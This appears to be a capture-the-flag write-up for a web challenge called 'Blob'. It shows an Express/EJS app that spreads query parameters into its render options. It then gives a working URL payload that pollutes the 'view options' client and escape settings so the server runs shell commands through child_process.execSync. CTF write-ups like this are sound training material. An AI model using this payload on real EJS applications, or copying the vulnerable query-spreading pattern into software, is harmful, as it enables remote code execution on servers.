### Challenge ###
Blob
334
Medium
blob says: blob

http://chal.competitivecyber.club:3000

Flag format: CACI{.*}

Author: CACI

### Solution ###

We have the source code of the website:
```
require("express")()
  .set("view engine", "ejs")
  .use((req, res) => res.render("index", { blob: "blob", ...req.query }))
  .listen(3000);
```

The source code is very small and doesn't have much to explore.
This challenge was vulnerable to server side prototype pollution.
We can add any number of get parameters into path.

When I started to solve the challenge i was stuck for a long time and then found this video: https://youtu.be/omMMpjywq64?si=0Q873VrRSxSEeos5

Even though this video talks about ssti it gave me the hint that we can also pass options with the data and then this writeup gave me the gadgets for rce: https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce#sspp_gadget

In the end I came up with this payload:
```
http://chal.competitivecyber.club:3000/?settings[view+options][client]=1&settings[view+options][escape]=console.log;return%20global.process.mainModule.constructor._load(%22child_process%22).execSync(%22ls%22);
```
The client and escape are both part of view options so we can pollute both of these to get rce.
The payload becomes something like this in the backend:
```
{
  settings: {
    'view options': {
      client: '1',
      escape: 'console.log;return global.process.mainModule.constructor._load("child_process").execSync("ls");'
    }
  }
}
```
